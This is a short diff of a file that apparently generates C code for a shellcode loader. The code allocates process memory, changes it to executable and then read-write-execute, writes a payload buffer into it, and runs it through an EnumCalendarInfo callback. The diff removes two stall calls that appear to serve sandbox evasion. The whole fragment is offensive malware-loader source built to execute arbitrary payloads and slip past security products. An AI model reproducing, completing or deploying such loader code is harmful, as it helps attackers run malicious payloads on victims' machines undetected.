@@ -27,9 +27,7 @@ var __c__sandbox2 = `
 var __c__callback = `
     DWORD oldProtect;
     VAVNtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
-    Love(1000000000000002049);
     VAVNtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
-    Love(1000000000000002049);
     VAVNtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
 	VAVNtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);
 	EnumCalendarInfo((CALINFO_ENUMPROC)addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
